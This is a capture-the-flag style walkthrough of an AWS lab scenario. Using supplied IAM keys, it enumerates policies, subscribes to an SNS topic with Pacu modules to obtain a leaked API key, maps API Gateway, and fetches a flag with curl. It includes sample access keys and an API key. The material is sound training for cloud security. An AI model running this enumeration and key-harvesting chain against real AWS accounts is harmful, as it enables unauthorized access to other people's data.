# SNS_Secrets Walkthrough

## Summary

In this scenario, you are provided with AWS credentials. You need to enumerate permissions and discover you can list and subscribe to SNS topics. You then use Pacu's new modules "sns__enum" and "sns__subscribe" to subscribe to the topic. You will receive an email from the topic with an API Key as a debug message. Then, use the AWS CLI to enumerate the API Gateways to find the API Gateway path, method, stage, and resource. Finally, do a curl request with the API key to get the final flag.

There is a detailed walkthrough on TryHackMe for this scenario: [SNS Secrets Walkthrough](https://tryhackme.com/jr/snssecretswalkthrough)

## Video Walkthrough
[![SNS_Secrets Video Walkthrough](https://i9.ytimg.com/vi/LBkuZa6niR0/mqdefault.jpg?v=665d1bd4&sqp=CIiU97IG&rs=AOn4CLAyCbeb1g5M58sdghxtQlC_dZECLw)](https://www.youtube.com/watch?v=LBkuZa6niR0)

## Detailed Walkthrough

### Configuring the AWS Keys

After launching the scenario, you will be provided with an Access Key ID and Secret Access Key for an IAM role. These allow you to interact with the AWS account from the IAM role using the CLI (Command Line Interface). You can set up an IAM profile with this command:

```bash
aws configure --profile sns-secrets
```

You will then be prompted for the Access Key ID, Secret, and Region. Provide the keys you received after launching the scenario. Below is an example (your keys will be different.)  

```bash
AWS Access Key ID: AKIA2GIZ2CSU6NO2YIXU
AWS Secret Access Key: SYpZBG++MXkmdvmUL614A4XAAs9L88QRrMOBhqZ9
Default region name: us-east-1
Default output format [None]:
```

Finally, you can confirm access by running the AWS equivalent of “whoami”: 

```bash
aws sts get-caller-identity --profile sns-secrets 
```

This should return the UserId, Account, and ARN for the role to verify you have access. 

### Discovering Permissions

Now that we have access to an IAM user in the AWS environment, we need to figure out what permissions we have. This can be done using the AWS CLI. First, we need to see what policies are connected to our user: 
(Note: The username can be found in the output of the “aws sts get-caller-identity” command we ran previously). 

```bash
aws iam list-user-policies --user-name [UserName] --profile sns-secrets
```

This command will return the policy name for our account. We can further enumerate this policy: 

```bash
aws iam get-user-policy --user-name [UserName] --policy-name [PolicyName] --profile sns-secrets 
```

The output of this command provides us with our policy; note our IAM User has permissions related to SNS, IAM, and API Gateway. 

### Subscribing to SNS

Amazon Simple Notification Service (SNS) is a managed messaging service that enables you to send notifications to subscribers using various methods like email, SMS, and HTTP. It's often used for alerting, sending updates, and integrating different systems by delivering messages reliably and quickly. It's important to limit SNS access to specific users to ensure the security and integrity of your messaging system. Unrestricted access could lead to unauthorized users sending spam, triggering unnecessary alerts, or accessing sensitive information.

We can enumerate SNS with Pacu. Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments. Instructions for installing Pacu are out-of-scope for this walkthrough but you can refer to the [official Pacu documentation on Github](https://github.com/RhinoSecurityLabs/pacu). Once Pacu is installed and a session is configured, you can import the profile you configured: 

```bash
Pacu (sns-secrets:imported-sns-secrets) > import_keys sns-secrets
```

There are two modules for interacting with SNS; you can find these by searching within Pacu: 

```bash
Pacu (sns-secrets:imported-sns-secrets) > search sns

[Category: ENUM]

    List and describe Simple Notification Service topics

  sns__enum

[Category: LATERAL_MOVE]

    Subscribe to a Simple Notification Service (SNS) topic

  sns__subscribe
```

Let’s begin with the “sns__enum” module. We can get more information with this command:

```bash
Pacu (sns-secrets:imported-sns-secrets) > help sns__enum
```

The module will attempt to list and gather information from Simple Notification Service topics. Let’s run it and see if it identifies an SNS topic we can access. 

```bash
Pacu (sns-secrets:imported-sns-secrets) > run sns__enum --region us-east-1
```

We can see the topic by typing “data” to access the Pacu database for our session. 

```bash
Pacu (sns-secrets:imported-sns-secrets) > data
```

Now that we have the full ARN of the SNS Topic, let’s check out the sns__subscribe module: 

```bash
Pacu (sns-secrets:imported-sns-secrets) > help sns__subscribe
```

This module will attempt to subscribe to a topic based on the ARN via an email address. We need to provide it with the topic and an email. 

```bash
Pacu (sns-secrets:imported-sns-secrets) > run sns__subscribe --topics [TopicARN] --email [Email Address]
```

After subscribing, you will need to go to your email and confirm the subscription: 

![Confirm Subscription](confirm-subscription.png)

### Accessing the API Gateway

After subscribing to the topic, you will receive an SNS Message that leaks an API Key for a API Gateway. 

![Leaked API Key](leaked-apikey.png)

Now that we have an API Key for an API Gateway, we need to identify the full URL to access the gateway. First, let’s try and retrieve basic information on the API: 

```bash
aws apigateway get-rest-apis --profile sns-secrets --region us-east-1
```

This provides us with the ID of the API Gateway. Using this ID we can get the stages and resources: 

```bash
aws apigateway get-stages --rest-api-id [API ID] --profile sns-secrets --region us-east-1
aws apigateway get-resources --rest-api-id [API ID] --profile sns-secrets --region us-east-1
```

These commands provide us with the following information:

- Stage Name
- Resource Path

![API Gateway Information](apigateway-info.png)

This information allows us to retrieve the full URL to the API Gateway:

```bash
https://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]
```

Finally, we can use a CURL request with the API Key to retrieve the final flag: 

```bash
curl -X GET \
  'https://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]' \
  -H 'x-api-key: 45a3da610dc64703b10e273a4db135bf'
```

![Final Flag](final-flag.png)
